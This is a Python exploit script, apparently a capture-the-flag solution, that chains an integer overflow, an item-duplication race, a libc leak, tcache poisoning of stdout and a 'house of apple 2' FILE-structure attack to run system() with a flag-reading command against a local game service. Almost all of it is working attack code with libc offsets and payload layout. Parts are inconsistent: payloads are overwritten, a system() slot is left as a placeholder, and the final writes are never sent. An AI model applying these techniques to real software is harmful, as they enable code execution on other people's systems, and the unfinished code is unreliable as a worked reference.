"""bad_puppet exploit - full chain.

Stage 1: u32 price*qty overflow -> 4.2B bombs -> one-shot Ganondorf -> The Ring.
Stage 2: stale-drop slot race (inv drop + inv sort in one write) -> ring duplication.
Stage 3: equip+sell 9 rings: 7 fill the 0x170 tcache(spilling to main_arena unsorted)
         -> `mw show` leaks main_arena == libc base.
Stage 4: tx-thread tcache poison ("fill" = clone sword/free ring, then whisper the
         freed ring's tcache next) -> clone_item lands on _IO_2_1_stdout_.
Stage 5: quit -> exit -> _IO_cleanup -> house of apple 2 -> system(cmd).
"""
from lib import *
import sys, time

HOST, PORT = "127.0.0.1", 30809

LIBC_STDOUT = 0x2055C0
LIBC_STDERR = 0x2054E0
LIBC_STDIN  = 0x2048E0
LIBC_WFILE_JUMPS = 0x203228
UNSORTED_OFF = 0x204C80     # leaked fd - libc_base

def p64(x): return x.to_bytes(8, "little")

class RGame(Game):
    def __init__(self, remote_mode=True):
        context.log_level = "error"
        if remote_mode:
            for attempt in range(10):
                try:
                    self.io = remote(HOST, PORT, timeout=12)
                    self.dead = False; self.buf = b""
                    time.sleep(0.6)
                    d = self.drain(1.2)
                    if b"help" in d or b"Hero starts" in d:
                        return
                    self.io.close()
                except Exception:
                    pass
                time.sleep(1.0)
            raise RuntimeError("connect failed")
        else:
            Game.__init__(self, use_remote=False)

    # whisper to an equipped ring: writes hex payload at its chunk base
    def whisper(self, dest_idx, payload, t=0.35):
        return self.cmd("mw whisper %d %s" % (dest_idx, payload.hex()), t)

def find_pair(items, drop_type, mirror_idx):
    """find index i so that v[i] is sacrificial (not a ring) and v[n-1-i] is mirror_idx"""
    n = len(items)
    for it in items:
        i = it["idx"]
        if i == mirror_idx: continue
        if it["type"] == "Ring": continue
        if drop_type and it["type"] not in drop_type: continue
        if (n - 1 - i) == mirror_idx:
            return i
    return None

def run(remote_mode=True, cmd="id;cat /flag*>/tmp/leak"):
    g = RGame(remote_mode)
    g.game_setup()
    # ---- stage 2: 13 dups -> 14 rings
    need = 14
    made = 0
    for k in range(need - 1):
        if g.dup_ring() is None:
            break
        made += 1
    items = g.inv()
    rings = [it for it in items if it["type"] == "Ring"]
    print("[*] rings after dups:", len(rings), "dups:", made)
    if len(rings) < 11:
        print("[-] not enough rings"); return None

    # ---- stage 3: leak
    for k in range(9):
        if g.equip_sell() is None: break
    eqs, _ = g.world()
    libc = None
    for e in eqs:
        h = e["head"]
        if h > 0x700000000000:            # libc-ish
            libc = h - UNSORTED_OFF
    print("[*] dest entries:", len(eqs), "libc:", hex(libc) if libc else None)
    if not libc:
        print("[-] leak failed"); print("\n".join("  [%d] %s" % (e["idx"], e["body"]) for e in eqs)); return None
    S = libc + LIBC_STDOUT
    print("[*] stdout =", hex(S))

    # payloads
    cmdb = cmd.encode() + b"\0"
    assert len(cmdb) <= 0x20, len(cmdb)
    payA = bytearray(127)
    payA[0:len(cmdb)] = cmdb
    payA[0x38:0x40] = p64(0)      # wide write_base (W+0x18, W=S+0x20)
    payA[0x40:0x48] = p64(1)      # wide write_ptr  (W+0x20)
    payA[0x50:0x58] = p64(0)      # wide buf_base   (W+0x30)
    payA[0x68:0x70] = p64(0)      # _chain = 0
    payB = bytearray(127)
    payB[0x00:0x08] = p64(0)      # _cur_column/_vtable_offset/_shortbuf
    payB[0x20:0x28] = p64(S + 0x20)   # _wide_data  (S+0xA0)
    payB[0x38:0x40] = p64(libc + 0x0)  # placeholder
    payB[0x38:0x40] = p64(0)
    payB[0x38:0x40] = p64(0)
    payB[0x38:0x40] = p64(0)
    # offsets inside payB are relative to S+0x80
    payB = bytearray(127)
    def setb(off, val):   # off is absolute offset in FILE
        o = off - 0x80
        payB[o:o+8] = p64(val)
    setb(0x80, 0)                 # _vtable_offset = 0
    setb(0x88, 0)                 # _lock
    setb(0x90, 0)                 # _offset
    setb(0x98, 0)                 # _codecvt
    setb(0xA0, S + 0x20)          # _wide_data = W
    setb(0xA8, 0)
    setb(0xB0, 0)
    setb(0xB8, libc)              # placeholder -> system
    setb(0xC0, 1)                 # _mode = 1
    setb(0xD0, S + 0x50)          # W+0xB0 : wide _wide_vtable = V
    setb(0xD8, libc + LIBC_WFILE_JUMPS)  # vtable
    setb(0xE0, libc + LIBC_STDERR)
    setb(0xE8, libc + LIBC_STDOUT)
    setb(0xF0, libc + LIBC_STDIN)
    return g, libc, S, payA, bytes(payB)

if __name__ == "__main__":
    r = run(len(sys.argv) < 2)
    if r:
        g, libc, S, payA, payB = r
        print("[*] ready: libc=%s S=%s" % (hex(libc), hex(S)))
        g.cmd("quit", 0.3)
